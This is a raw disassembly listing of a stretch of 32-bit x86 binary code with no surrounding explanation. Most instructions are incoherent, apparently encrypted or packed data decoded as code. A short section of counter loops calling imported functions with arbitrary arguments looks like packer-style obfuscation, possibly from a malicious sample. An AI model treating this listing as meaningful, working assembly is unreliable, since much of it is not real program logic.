  40ab2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab30:	loope  0x40ab2f
  40ab32:	cdq    
  40ab33:	fdivr  QWORD PTR [esi-0x113ab1d7]
  40ab39:	mov    eax,0x81b28144
  40ab3e:	ins    BYTE PTR es:[edi],dx
  40ab3f:	test   eax,0x35c0dee3
  40ab44:	fs retf 0x847c
  40ab48:	mov    bh,0x56
  40ab4a:	in     eax,0x20
  40ab4c:	xchg   BYTE PTR [ebx+ecx*1+0x7f95d062],ah
  40ab53:	shl    al,cl
  40ab55:	fist   DWORD PTR [ebp-0x6f206e61]
  40ab5b:	pop    esi
  40ab5c:	clc    
  40ab5d:	push   ecx
  40ab5e:	fwait
  40ab5f:	jl     0x40ab4c
  40ab61:	stc    
  40ab62:	jb     0x40ab51
  40ab64:	jp     0x40ab29
  40ab66:	xor    edx,DWORD PTR [edx-0x359837a9]
  40ab6c:	scas   al,BYTE PTR es:[edi]
  40ab6d:	imul   DWORD PTR [edi]
  40ab6f:	sti    
  40ab70:	fs je  0x40ab49
  40ab73:	mov    WORD PTR [edx+0xc7773a],ds
  40ab79:	and    eax,DWORD PTR [edx-0x42f7a90]
  40ab7f:	call   FWORD PTR [ebp+0x16]
  40ab82:	mov    ebx,0xf4f415d3
  40ab87:	ficom  WORD PTR [eax-0x7b]
  40ab8a:	out    0x63,eax
  40ab8c:	adc    DWORD PTR [ebx+eiz*8],0xec8b38f7
  40ab93:	pusha  
  40ab94:	shl    DWORD PTR [ebp+0x2fadbf7],cl
  40ab9a:	gs push ds
  40ab9c:	mov    ecx,edx
  40ab9e:	inc    eax
  40ab9f:	(bad)  
  40aba0:	adc    al,0xb6
  40aba2:	sbb    bh,BYTE PTR [ebp+0x5fab5bb3]
  40aba8:	or     BYTE PTR [ebp+0x11911b00],ch
  40abae:	repz cmp eax,0xa083f635
  40abb4:	cmp    eax,0x15a012a8
  40abb9:	lock push ecx
  40abbb:	daa    
  40abbc:	js     0x40ab49
  40abbe:	stos   BYTE PTR es:[edi],al
  40abbf:	or     eax,0x4be60c54
  40abc4:	(bad)  
  40abc5:	adc    DWORD PTR [edi+0x43],edx
  40abc8:	pop    eax
  40abc9:	loopne 0x40ac33
  40abcb:	xor    eax,0x44b1e3f
  40abd0:	and    BYTE PTR [eax+0x4ac8a402],ah
  40abd6:	or     al,BYTE PTR [edi+0x7e]
  40abd9:	jae    0x40ac44
  40abdb:	xchg   bh,bh
  40abdd:	sub    eax,0xc9635dfe
  40abe2:	mov    ebp,0xdc79211b
  40abe7:	in     al,0xf2
  40abe9:	pop    edi
  40abea:	dec    edx
  40abeb:	sbb    DWORD PTR [ebx-0x680e8878],esi
  40abf1:	test   esp,edi
  40abf3:	call   0xce106bbb
  40abf8:	cs aaa 
  40abfa:	lods   al,BYTE PTR ds:[esi]
  40abfb:	in     al,dx
  40abfc:	pop    ebx
  40abfd:	mov    dl,0x2f
  40abff:	ret    
  40ac00:	shl    BYTE PTR [eax-0x7149848b],cl
  40ac06:	ja     0x40ac1b
  40ac08:	jae    0x40abec
  40ac0a:	cs ret 
  40ac0c:	xchg   esi,eax
  40ac0d:	xor    ebp,0xfce614e6
  40ac13:	push   esi
  40ac14:	add    al,0x4d
  40ac16:	not    BYTE PTR [edx+0x2aeb9945]
  40ac1c:	rcl    BYTE PTR [ebx+edx*2+0x5a71fa59],0x42
  40ac24:	sti    
  40ac25:	outs   dx,DWORD PTR ds:[esi]
  40ac26:	xlat   BYTE PTR ds:[ebx]
  40ac27:	mov    ds:0x92dc2fb2,al
  40ac2c:	mov    edi,0xfa59348
  40ac31:	out    dx,al
  40ac32:	popf   
  40ac33:	aad    0x66
  40ac35:	cmp    DWORD PTR [ebx-0x2b163413],ecx
  40ac3b:	cmp    ah,ch
  40ac3d:	call   0x665:0xd5b476e9
  40ac44:	push   ebx
  40ac45:	sub    DWORD PTR [ecx+0x997d3d4],edx
  40ac4b:	mov    cl,0x9
  40ac4d:	add    al,0x36
  40ac4f:	inc    ebp
  40ac50:	inc    DWORD PTR [ecx-0x65]
  40ac53:	inc    ebp
  40ac54:	data16 das 
  40ac56:	clc    
  40ac57:	inc    esp
  40ac58:	mov    ebx,0x80bf732
  40ac5d:	mov    ebp,0x9c02cd3a
  40ac62:	scas   al,BYTE PTR es:[edi]
  40ac63:	test   eax,0xeaeeba63
  40ac68:	push   cs
  40ac69:	ret    0x43fd
  40ac6c:	ja     0x40ac2c
  40ac6e:	scas   eax,DWORD PTR es:[edi]
  40ac6f:	ins    DWORD PTR es:[edi],dx
  40ac70:	je     0x40ace2
  40ac72:	addr16 (bad) 
  40ac74:	out    0x33,al
  40ac76:	in     al,dx
  40ac77:	jbe    0x40ac34
  40ac79:	lods   al,BYTE PTR ds:[esi]
  40ac7a:	mov    DWORD PTR [eax],eax
  40ac7c:	mov    edi,edx
  40ac7e:	clc    
  40ac7f:	xlat   BYTE PTR ds:[ebx]
  40ac80:	adc    eax,0x7d7c101b
  40ac85:	mov    gs,esi
  40ac87:	pusha  
  40ac88:	cmp    eax,0x91c6698f
  40ac8d:	test   DWORD PTR [ebx],ecx
  40ac8f:	and    ecx,DWORD PTR [eax-0x6f]
  40ac92:	inc    edx
  40ac93:	rcl    DWORD PTR [ecx],1
  40ac95:	push   edx
  40ac96:	std    
  40ac97:	add    cl,BYTE PTR ds:0xbc4fd191
  40ac9d:	inc    eax
  40ac9e:	mov    BYTE PTR [eax],dl
  40aca0:	sahf   
  40aca1:	pop    ebp
  40aca2:	adc    eax,0x2b09951
  40aca7:	mov    cl,0x74
  40aca9:	lds    ebx,FWORD PTR [eax]
  40acab:	jno    0x40ac42
  40acad:	jmp    0x40acab
  40acaf:	cmp    ah,cl
  40acb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acb2:	hlt    
  40acb3:	inc    ebp
  40acb4:	jne    0x40ac43
  40acb6:	cwde   
  40acb7:	inc    ebx
  40acb8:	daa    
  40acb9:	cwde   
  40acba:	xchg   ebx,eax
  40acbb:	pop    esi
  40acbc:	ret    0xfea4
  40acbf:	jmp    0x40ad10
  40acc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acc2:	test   eax,0xa3df5dd8
  40acc7:	add    al,0x6a
  40acc9:	pop    ecx
  40acca:	push   esi
  40accb:	loope  0x40ad00
  40accd:	jmp    0xa2de101a
  40acd2:	aad    0x10
  40acd4:	jo     0x40ac5a
  40acd6:	rol    BYTE PTR [edi-0x1500c3a3],1
  40acdc:	je     0x40acc4
  40acde:	outs   dx,BYTE PTR ds:[esi]
  40acdf:	fisttp QWORD PTR [ebx+0x18885a3]
  40ace5:	dec    edi
  40ace6:	int3   
  40ace7:	xor    al,0x41
  40ace9:	xchg   esi,eax
  40acea:	add    BYTE PTR [eax+edi*2-0x677f85c2],0xf1
  40acf2:	cmp    eax,0x3573d8db
  40acf7:	jl     0x40ad60
  40acf9:	cmp    eax,0xf74e0e66
  40acfe:	xchg   BYTE PTR [esi+0x3e],al
  40ad01:	xor    DWORD PTR [eax-0x13],ebx
  40ad04:	ins    BYTE PTR es:[edi],dx
  40ad05:	inc    esp
  40ad06:	dec    ebp
  40ad07:	dec    ebp
  40ad08:	push   esi
  40ad09:	pop    ecx
  40ad0a:	popa   
  40ad0b:	push   es
  40ad0c:	xchg   edi,eax
  40ad0d:	and    BYTE PTR [ebx+0x45],bl
  40ad10:	mov    ds:0xcfa97087,al
  40ad15:	cmp    al,0x15
  40ad17:	xchg   esi,edx
  40ad19:	arpl   WORD PTR [edi+ebp*8],bp
  40ad1c:	cs jmp 0xcbf01f26
  40ad22:	pop    es
  40ad23:	inc    edi
  40ad24:	lods   eax,DWORD PTR ds:[esi]
  40ad25:	stc    
  40ad26:	jns    0x40ad0c
  40ad28:	repz js 0x40ad51
  40ad2b:	or     ebx,ebp
  40ad2d:	dec    eax
  40ad2e:	mov    dl,0x43
  40ad30:	adc    al,0x31
  40ad32:	(bad)  
  40ad33:	sahf   
  40ad34:	inc    ebp
  40ad35:	pop    ebp
  40ad36:	gs and cl,dh
  40ad39:	sbb    dl,dl
  40ad3b:	lods   eax,DWORD PTR ds:[esi]
  40ad3c:	cdq    
  40ad3d:	pop    ebp
  40ad3e:	out    0x71,al
  40ad40:	enter  0x9c6e,0xf4
  40ad44:	cmp    eax,0x1e3bb288
  40ad49:	out    0xf8,al
  40ad4b:	in     al,0x2b
  40ad4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad4e:	daa    
  40ad4f:	out    0xcb,al
  40ad51:	repnz ss and al,0x90
  40ad56:	mov    edi,0x697a3c07
  40ad5b:	sar    DWORD PTR [edi+ebp*1],0x5c
  40ad5f:	sub    edi,edi
  40ad61:	cmp    eax,0xe3c912b7
  40ad66:	jno    0x40ad91
  40ad68:	push   edx
  40ad69:	xchg   edx,eax
  40ad6a:	lahf   
  40ad6b:	mov    BYTE PTR [eax-0x7ee14e97],dl
  40ad71:	mov    dl,0x13
  40ad73:	icebp  
  40ad74:	rol    BYTE PTR [ecx-0x327ba1ad],cl
  40ad7a:	rcr    BYTE PTR [ebp-0x35],cl
  40ad7d:	cld    
  40ad7e:	or     al,0x59
  40ad80:	xchg   esi,eax
  40ad81:	hlt    
  40ad82:	add    ch,BYTE PTR [ecx+0x3]
  40ad85:	xor    BYTE PTR [ebp+0x7e334dcc],0x2a
  40ad8c:	jecxz  0x40ada7
  40ad8e:	adc    BYTE PTR [ebp+0x52],dh
  40ad91:	bound  edi,QWORD PTR [eax-0x1a2cf8f3]
  40ad97:	pop    ebx
  40ad98:	mov    WORD PTR [ecx],ss
  40ad9a:	jne    0x40adfc
  40ad9c:	sbb    eax,0x3db92811
  40ada1:	popf   
  40ada2:	js     0x40ad24
  40ada4:	scas   al,BYTE PTR es:[edi]
  40ada5:	or     BYTE PTR [eax-0x4c],cl
  40ada8:	shl    BYTE PTR [ebp-0x7393c17d],0xc3
  40adaf:	pop    ds
  40adb0:	mov    ds:0x37c1e1b9,al
  40adb5:	jp     0x40ad4d
  40adb7:	nop
  40adb8:	inc    ecx
  40adb9:	xchg   ebx,eax
  40adba:	cld    
  40adbb:	xchg   esi,eax
  40adbc:	cmp    cl,al
  40adbe:	push   ecx
  40adbf:	dec    esi
  40adc0:	jecxz  0x40adda
  40adc2:	push   ecx
  40adc3:	call   0x61a3:0x44fb06cd
  40adca:	dec    esi
  40adcb:	sbb    DWORD PTR [ebx],0xffffffb4
  40adce:	cmp    DWORD PTR [ecx+eax*1-0xce0defb],ecx
  40add5:	ret    
  40add6:	loope  0x40ae39
  40add8:	push   cs
  40add9:	dec    ecx
  40adda:	ret    0xa3d4
  40addd:	push   ss
  40adde:	cdq    
  40addf:	dec    eax
  40ade0:	xchg   BYTE PTR [ebx-0x4a7fac4b],dl
  40ade6:	nop
  40ade7:	sbb    eax,0x334961f8
  40adec:	outs   dx,BYTE PTR ds:[esi]
  40aded:	rol    BYTE PTR [ebx],cl
  40adef:	pusha  
  40adf0:	mov    edi,0x5f8d838d
  40adf5:	push   ds
  40adf6:	push   esi
  40adf7:	inc    esp
  40adf8:	xor    edi,DWORD PTR [ebx+0x20]
  40adfb:	jle    0x40adcd
  40adfd:	pop    ebp
  40adfe:	mov    ch,0xf6
  40ae00:	cli    
  40ae01:	sti    
  40ae02:	cmp    al,0xe1
  40ae04:	fwait
  40ae05:	mov    esp,DWORD PTR [ebp-0x45]
  40ae08:	es mov bl,0xe0
  40ae0b:	jmp    0x40ae09
  40ae0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae0e:	mov    eax,ds:0xc4bf2b62
  40ae13:	jmp    0x40ae7d
  40ae15:	xor    BYTE PTR [ebx-0x569cdc6c],ch
  40ae1b:	push   esp
  40ae1c:	ss dec ebx
  40ae1e:	icebp  
  40ae1f:	or     eax,0x3a3e4301
  40ae24:	clc    
  40ae25:	add    dh,BYTE PTR ds:0x67b5ca8f
  40ae2b:	rol    ebx,0xa0
  40ae2e:	aaa    
  40ae2f:	paddusw mm1,QWORD PTR [esi+0x55]
  40ae33:	inc    esi
  40ae34:	fistp  WORD PTR [edx+0x34]
  40ae37:	sbb    dh,BYTE PTR [ebx+0x3e]
  40ae3a:	scas   eax,DWORD PTR es:[edi]
  40ae3b:	mov    edi,0x8f6536de
  40ae40:	push   esp
  40ae41:	(bad)  
  40ae43:	fdiv   DWORD PTR [esi-0x4de48efa]
  40ae49:	popa   
  40ae4a:	outs   dx,DWORD PTR ds:[esi]
  40ae4b:	jl     0x40aeb2
  40ae4d:	das    
  40ae4e:	fldcw  WORD PTR [eax+eiz*2+0x6dcfe150]
  40ae55:	lods   eax,DWORD PTR ds:[esi]
  40ae56:	inc    DWORD PTR [ecx+0x21]
  40ae59:	sbb    al,0xc7
  40ae5b:	pop    eax
  40ae5c:	ficom  WORD PTR [esi+0x7f]
  40ae5f:	add    bh,BYTE PTR [ebx+0x64]
  40ae62:	push   ebp
  40ae63:	stc    
  40ae64:	rcl    DWORD PTR [eax+0x7],1
  40ae67:	pushf  
  40ae68:	inc    esi
  40ae69:	inc    ebx
  40ae6a:	mov    dl,0x28
  40ae6c:	sbb    bl,BYTE PTR [esp+ebp*8]
  40ae6f:	and    ecx,DWORD PTR [ecx+0x40]
  40ae72:	pop    ds
  40ae73:	mov    cs,WORD PTR [ebx+eax*1]
  40ae76:	add    ch,BYTE PTR [ebx-0x78]
  40ae79:	fmul   DWORD PTR [eax]
  40ae7b:	adc    BYTE PTR [ebx],ah
  40ae7d:	mov    esp,0x6b94fca2
  40ae82:	jp     0x40ae63
  40ae84:	lods   eax,DWORD PTR ds:[esi]
  40ae85:	les    ebp,FWORD PTR [ecx]
  40ae87:	mov    ecx,0xade54e24
  40ae8c:	inc    ecx
  40ae8d:	dec    eax
  40ae8e:	dec    edx
  40ae8f:	xor    al,bl
  40ae91:	push   0xffffffbc
  40ae93:	dec    ecx
  40ae94:	lea    ebp,[ecx]
  40ae96:	dec    ebp
  40ae97:	pop    eax
  40ae98:	in     eax,0xed
  40ae9a:	jecxz  0x40ae2e
  40ae9c:	je     0x40ae5b
  40ae9e:	sbb    BYTE PTR [edi+0x96bff1d],0x7e
  40aea5:	inc    ecx
  40aea6:	push   esp
  40aea7:	nop
  40aea8:	mov    ds:0x68f1553f,eax
  40aead:	ins    DWORD PTR es:[edi],dx
  40aeae:	sub    ah,ch
  40aeb0:	shr    DWORD PTR [eax+eiz*1-0x28],0xb
  40aeb5:	test   al,0x2c
  40aeb8:	adc    DWORD PTR [ebp-0xa],edx
  40aebb:	fcomp  QWORD PTR [esi-0xf2a9833]
  40aec1:	cmp    al,0x1a
  40aec3:	xor    eax,0xf86ef40d
  40aec8:	jmp    0x40ae61
  40aeca:	mov    ds,esp
  40aecc:	cmp    al,0x43
  40aece:	pop    ebx
  40aecf:	cmp    eax,DWORD PTR [ebx]
  40aed1:	ror    DWORD PTR [edi],1
  40aed3:	scas   eax,DWORD PTR es:[edi]
  40aed4:	xlat   BYTE PTR ds:[ebx]
  40aed5:	xor    ebx,DWORD PTR ds:0x434553
  40aedb:	mov    edi,DWORD PTR [ebp-0x8]
  40aede:	mov    ebx,DWORD PTR [ebp-0x10]
  40aee1:	xor    DWORD PTR ds:0x434547,0x7c2a
  40aeeb:	sub    ebx,edi
  40aeed:	mov    DWORD PTR ds:0x43453f,0x592f
  40aef7:	cmp    ebx,edx
  40aef9:	mov    DWORD PTR ds:0x4345ff,0x4e0a
  40af03:	ja     0x40af21
  40af09:	mov    DWORD PTR ds:0x43458f,ebx
  40af0f:	mov    edx,DWORD PTR [ebp-0x28]
  40af12:	mov    DWORD PTR ds:0x4344ef,0x4d1d
  40af1c:	jmp    0x40bcba
  40af21:	sub    DWORD PTR ds:0x43453b,ebx
  40af27:	mov    edx,DWORD PTR [ebp-0x30]
  40af2a:	add    edi,edi
  40af2c:	mov    edi,DWORD PTR [ebp-0x4]
  40af2f:	and    DWORD PTR ds:0x434547,0x0
  40af39:	jmp    0x40af4d
  40af3e:	xor    ebx,ebx
  40af40:	or     ebx,DWORD PTR ds:0x434547
  40af46:	inc    ebx
  40af47:	mov    DWORD PTR ds:0x434547,ebx
  40af4d:	cmp    DWORD PTR ds:0x434547,0x1a
  40af54:	jae    0x40af87
  40af5a:	cmp    DWORD PTR ds:0x434547,0x22
  40af61:	jne    0x40af82
  40af67:	push   0x434577
  40af6c:	push   DWORD PTR [ebp-0x28]
  40af6f:	push   0x43458b
  40af74:	push   0x42d8
  40af79:	push   DWORD PTR [ebp-0x24]
  40af7c:	call   DWORD PTR ds:0x4130c4
  40af82:	jmp    0x40af3e
  40af87:	xor    edx,eax
  40af89:	xor    ebx,0x22d8
  40af8f:	xor    edi,eax
  40af91:	add    edi,ecx
  40af93:	and    DWORD PTR ds:0x434613,0x0
  40af9d:	mov    ebx,DWORD PTR ds:0x434613
  40afa3:	inc    ebx
  40afa4:	mov    DWORD PTR ds:0x434613,ebx
  40afaa:	cmp    DWORD PTR ds:0x434613,0x23
  40afb1:	jne    0x40afd2
  40afb7:	push   DWORD PTR [ebp-0x10]
  40afba:	push   DWORD PTR [ebp-0x18]
  40afbd:	push   0x635c
  40afc2:	push   0x3675
  40afc7:	push   0x36d2
  40afcc:	call   DWORD PTR ds:0x413290
  40afd2:	cmp    DWORD PTR ds:0x434613,0x14
  40afd9:	jb     0x40af9d
  40afdf:	add    edx,ecx
  40afe1:	imul   edx,edi
  40afe4:	mov    edi,DWORD PTR [ebp-0x8]
  40afe7:	mov    ebx,DWORD PTR [ebp-0x10]
  40afea:	jmp    0x40b401
  40afef:	aas    
  40aff0:	and    DWORD PTR [eax],0xefb16010
  40aff6:	push   ecx
  40aff7:	repnz test al,0x23
  40affa:	pusha  
  40affb:	stos   DWORD PTR es:[edi],eax
  40affc:	in     al,0xd4
  40affe:	xor    eax,0x7e7efaf6
  40b003:	jo     0x40b07e
  40b005:	jle    0x40b085
  40b007:	sbb    ch,BYTE PTR [ebx+0x3c]
  40b00a:	inc    esp
  40b00b:	ins    BYTE PTR es:[edi],dx
  40b00c:	out    dx,eax
  40b00d:	popf   
  40b00e:	aas    
  40b00f:	xchg   edx,eax
  40b010:	test   BYTE PTR [ebp+0x37f02a42],cl
  40b016:	add    eax,DWORD PTR [edx+0x3e]
  40b019:	xor    ecx,DWORD PTR [ecx-0x784ff058]
  40b01f:	or     bl,dl
  40b021:	dec    edi
  40b022:	xchg   esi,eax
  40b023:	inc    edi
  40b024:	retf   0x393d
  40b027:	fbld   TBYTE PTR [edi+0x3659efc]
  40b02d:	or     bh,BYTE PTR [ecx+esi*8]
  40b030:	mov    cs,WORD PTR [ebx]
  40b032:	out    dx,eax
  40b033:	dec    ecx
  40b034:	or     al,0x86
  40b036:	fdiv   DWORD PTR [ebp+0x25]
  40b039:	fidivr WORD PTR [edi+eax*4]
  40b03c:	push   ss
  40b03d:	pop    ss
  40b03e:	or     eax,0x5e897dd
  40b043:	add    ch,dh
  40b045:	cwde   
  40b046:	pop    esi
  40b047:	sub    eax,esp
  40b049:	data16 jno 0x40b087
  40b04c:	sbb    al,0x20
  40b04e:	sub    al,0x9e
  40b050:	xor    ah,BYTE PTR [esi+0x3d8569a0]
  40b056:	pop    edi
  40b057:	xchg   esi,eax
  40b058:	pop    es
  40b059:	or     BYTE PTR [eax-0x36],cl
  40b05c:	test   edx,edi
  40b05e:	addr16 in al,0xc6
  40b061:	push   0x71
  40b063:	mov    ds,WORD PTR [bx-0x46]
  40b067:	bound  esp,QWORD PTR [eax+edi*8]
  40b06a:	leave  
  40b06b:	call   0x6863c879
  40b070:	outs   dx,BYTE PTR ds:[esi]
  40b071:	push   esi
  40b072:	mov    ds,esp
  40b074:	mov    eax,ds:0x8dedb957
  40b079:	cdq    
  40b07a:	cwde   
  40b07b:	push   edx
  40b07c:	fstp   st(4)
  40b07e:	packssdw mm0,QWORD PTR [edi]
  40b081:	or     dh,al
  40b083:	popf   
  40b084:	es ss dec ebp
  40b087:	mov    dl,bh
  40b089:	mov    dh,0xf7
  40b08b:	or     edi,DWORD PTR [edx+0x1c]
  40b08e:	push   esi
  40b08f:	jmp    0xe15d7e0d
  40b094:	int3   
  40b095:	bnd jl 0x40b0d2
  40b098:	add    DWORD PTR [edi],edi
  40b09a:	pop    ss
  40b09b:	in     al,0x97
  40b09d:	add    BYTE PTR [ebx],bh
  40b09f:	push   ds
  40b0a0:	fabs   
  40b0a2:	jno    0x40b0fa
  40b0a4:	les    esp,FWORD PTR [edx-0x3948f528]
  40b0aa:	popf   
  40b0ab:	dec    ebx
  40b0ac:	mov    edi,DWORD PTR es:[ecx-0x1e]
  40b0b0:	pop    ss
  40b0b1:	or     al,0xf5
  40b0b3:	ret    0xaaab
  40b0b6:	xchg   esi,eax
  40b0b7:	icebp  
  40b0b8:	in     al,dx
  40b0b9:	out    dx,al
  40b0ba:	adc    dl,ch
  40b0bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0bd:	and    eax,0x2c12ec9f
  40b0c2:	mov    ecx,0xa5cd3fe8
  40b0c7:	popf   
  40b0c8:	jl     0x40b0be
  40b0ca:	inc    esp
  40b0cb:	outs   dx,BYTE PTR ds:[esi]
  40b0cc:	xchg   ebx,eax
  40b0cd:	lea    esp,[ecx]
  40b0cf:	mov    eax,0x4bb3a54e
  40b0d4:	jo     0x40b0e2
  40b0d6:	push   eax
  40b0d7:	outs   dx,DWORD PTR ds:[esi]
  40b0d8:	jmp    0x8f8ae765
  40b0dd:	addr16 mov esi,0xd594facc
  40b0e3:	pop    edi
  40b0e4:	call   0x10406323
  40b0e9:	xor    eax,0x8cb6fbdd
  40b0ee:	jb     0x40b0c1
  40b0f0:	inc    edi
  40b0f1:	mov    cl,0x4f
  40b0f3:	push   ebp
  40b0f4:	or     BYTE PTR [esi-0x78],bh
  40b0f7:	fcmovnb st,st(6)
  40b0f9:	cmc    
  40b0fa:	dec    ebx
  40b0fb:	das    
  40b0fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0fd:	pop    ss
  40b0fe:	push   eax
  40b0ff:	fistp  QWORD PTR [esi+esi*8+0x486f0e25]
  40b106:	stc    
  40b107:	jmp    0xb560e70b
  40b10c:	jae    0x40b174
  40b10e:	mov    esp,0x1bf1ac67
  40b113:	cmp    bl,BYTE PTR [eax-0x79cfeb03]
  40b119:	and    ebx,DWORD PTR [edx-0x50]
  40b11c:	push   ss
  40b11d:	inc    ebx
  40b11e:	xor    al,0xab
  40b120:	push   ss
  40b121:	pusha  
  40b122:	in     eax,0x3e
  40b124:	dec    edx
  40b125:	mov    gs,WORD PTR [ebx+0x3]
  40b128:	sbb    eax,0x315bfd3c
  40b12d:	jbe    0x40b1a0
  40b12f:	stc    
  40b130:	jle    0x40b18e
  40b132:	adc    DWORD PTR [ecx],0xe0e82439
  40b138:	(bad)  
  40b139:	jg     0x40b0d4
  40b13b:	test   al,0x5e
  40b13d:	sub    al,ah
  40b13f:	dec    ebx
  40b140:	(bad)  
  40b141:	fmul   st,st(7)
  40b143:	mov    ss:0xdfd9dc08,al
  40b149:	ret    0x1b0f
  40b14c:	add    eax,0xc3b1df1b
  40b151:	aad    0xac
  40b153:	cmp    BYTE PTR [ecx+ebx*2+0x6c],dl
  40b157:	pop    ebp
  40b158:	loop   0x40b0f7
  40b15a:	fsubr  st,st(4)
  40b15c:	push   edi
  40b15d:	mov    ds:0x8662d2c2,eax
  40b162:	mov    dl,0xd8
  40b164:	jmp    0xc86c7291
  40b169:	or     DWORD PTR [esi-0x50],ebx
  40b16c:	(bad)  
  40b16d:	xchg   edx,eax
  40b16e:	jae    0x40b1c5
  40b170:	and    bh,BYTE PTR [edi+0x3c]
  40b173:	jns    0x40b108
  40b175:	mov    edx,0x23a03970
  40b17a:	lods   al,BYTE PTR ds:[esi]
  40b17b:	aam    0x36
  40b17d:	jb     0x40b1c2
  40b17f:	retf   
  40b180:	aam    0x8f
  40b182:	add    al,0xe8
  40b184:	inc    ebp
  40b185:	in     al,dx
  40b186:	pop    esp
  40b187:	ins    BYTE PTR es:[edi],dx
  40b188:	pop    ds
  40b189:	pop    es
  40b18a:	dec    esi
  40b18b:	sbb    ebx,DWORD PTR [ebx-0x23666a00]
  40b191:	out    0xc6,al
  40b193:	je     0x40b19d
  40b195:	ss inc edi
  40b197:	pop    edx
  40b198:	push   cs
  40b199:	pop    eax
  40b19a:	(bad)  
  40b19b:	push   ss
  40b19c:	outs   dx,BYTE PTR ds:[esi]
  40b19d:	adc    esi,ebp
  40b19f:	jle    0x40b168
  40b1a1:	push   ecx
  40b1a2:	cmp    ecx,ebx
  40b1a4:	inc    ecx
  40b1a5:	outs   dx,DWORD PTR fs:[esi]
  40b1a7:	add    eax,0x23a6f27
  40b1ac:	mov    edx,0x706e2c23
  40b1b1:	das    
  40b1b2:	jge    0x40b1dd
  40b1b4:	dec    esp
  40b1b5:	aad    0xca
  40b1b7:	(bad)  
  40b1b8:	dec    DWORD PTR [esi-0x5c80171f]
  40b1be:	ja     0x40b1a8
  40b1c0:	add    ecx,ebx
  40b1c2:	inc    ebp
  40b1c3:	std    
  40b1c4:	popa   
  40b1c5:	test   DWORD PTR [esi],ebp
  40b1c7:	jbe    0x40b175
  40b1c9:	or     DWORD PTR [ecx-0x6d],ebx
  40b1cc:	pop    esi
  40b1cd:	mov    edx,0x9c42c1ef
  40b1d2:	xchg   esp,eax
  40b1d3:	ds sub al,0xec
  40b1d6:	add    al,0xe6
  40b1d8:	adc    eax,0x9c17e0eb
  40b1dd:	sbb    bl,BYTE PTR [eax]
  40b1df:	xor    esp,esi
  40b1e1:	and    eax,0x440ae862
  40b1e6:	aam    0xdd
  40b1e8:	adc    dl,BYTE PTR [ecx-0x49]
  40b1eb:	enter  0xd023,0x30
  40b1ef:	arpl   WORD PTR [edi-0x322fa23f],di
  40b1f5:	retf   0x12c2
  40b1f8:	push   0x26cc25ae
  40b1fd:	loop   0x40b1cc
  40b1ff:	loop   0x40b1c6
  40b201:	lahf   
  40b202:	repnz and BYTE PTR [edx-0x7a],dl
  40b206:	int3   
  40b207:	scas   eax,DWORD PTR es:[edi]
  40b208:	retf   
  40b209:	pop    eax
  40b20a:	pop    ss
  40b20b:	loop   0x40b19e
  40b20d:	inc    esp
  40b20e:	(bad)  
  40b20f:	dec    DWORD PTR [edx-0x587b62e1]
  40b215:	fwait
  40b216:	mov    al,ds:0xa43d8528
  40b21b:	pop    esi
  40b21c:	jo     0x40b1e2
  40b21e:	(bad)  
  40b220:	adc    DWORD PTR [edx],edx
  40b222:	(bad)  
  40b223:	jmp    0xf10e:0x18952d9f
  40b22a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b22b:	xchg   BYTE PTR [ebp+0x24efc168],ch
  40b231:	push   0x4b
  40b233:	dec    ebx
  40b234:	test   DWORD PTR [edx-0x3c5b7be0],0x332e094c
  40b23e:	stc    
  40b23f:	mov    ebp,0x477bcd30
  40b244:	push   0x34
  40b246:	push   0xfffffffe
  40b248:	jns    0x40b1cb
  40b24a:	gs jnp 0x40b1db
  40b24d:	inc    ecx
  40b24e:	push   cs
  40b24f:	push   ecx
  40b250:	out    dx,eax
  40b251:	popa   
  40b252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b253:	in     eax,0x7a
  40b255:	xor    BYTE PTR [ecx-0x3e3bc1b8],dh
  40b25b:	mov    bh,0x95
  40b25d:	or     edi,edx
  40b25f:	and    al,ch
  40b261:	mov    esi,eax
  40b263:	xor    BYTE PTR [edx],0x9d
  40b266:	push   eax
  40b267:	int    0x9e
  40b269:	je     0x40b20f
  40b26b:	cmp    DWORD PTR [esi],eax
  40b26d:	dec    edx
  40b26e:	cli    
  40b26f:	push   es
  40b270:	and    DWORD PTR [esi-0x56],esi
  40b273:	and    DWORD PTR [ebx+edi*2-0x1eaeb857],eax
  40b27a:	jmp    0x40b2f4
  40b27c:	or     bh,dh
  40b27e:	adc    DWORD PTR [esi+0x13c5b8dc],eax
  40b284:	xchg   esp,eax
  40b285:	enter  0x93e8,0xb4
  40b289:	sub    DWORD PTR [ebp-0x44],ebx
  40b28c:	dec    esp
  40b28d:	mov    eax,0xb714370a
  40b292:	push   0xffffff8a
  40b294:	dec    ecx
  40b295:	mov    dh,0x6f
  40b297:	jmp    0x40b2c8
  40b299:	pop    ecx
  40b29a:	(bad)  
  40b29b:	imul   edx,DWORD PTR [edx],0x7b
  40b29e:	out    dx,eax
  40b29f:	jae    0x40b2c0
  40b2a1:	mov    ds,WORD PTR [edi+0x14674c4a]
  40b2a7:	push   ebp
  40b2a8:	adc    cl,bh
  40b2aa:	cdq    
  40b2ab:	retf   0xb7b3
  40b2ae:	mov    dl,0xa6
  40b2b0:	leave  
  40b2b1:	or     eax,ebp
  40b2b3:	sahf   
  40b2b4:	in     al,0xfd
  40b2b6:	ss pop ebx
  40b2b9:	es call 0xcaeb:0x31a4c697
  40b2c1:	stos   DWORD PTR es:[edi],eax
  40b2c2:	inc    esi
  40b2c3:	jge    0x40b2cc
  40b2c5:	xchg   DWORD PTR [ebx-0x5079354e],esp
  40b2cb:	iret   
  40b2cc:	mov    WORD PTR [esi-0x1c],fs
  40b2cf:	outs   dx,DWORD PTR ds:[esi]
  40b2d0:	mov    ds:0x70353ad,eax
  40b2d5:	lods   al,BYTE PTR ds:[esi]
  40b2d6:	adc    edx,DWORD PTR ds:0x53ace9cc
  40b2dc:	cmp    al,0xd3
  40b2de:	adc    ch,BYTE PTR [edx+0x37]
  40b2e1:	push   ss
  40b2e2:	adc    al,0xa6
  40b2e4:	mov    ds:0x25d78a6a,al
  40b2e9:	cmp    DWORD PTR [ecx+0x5a],eax
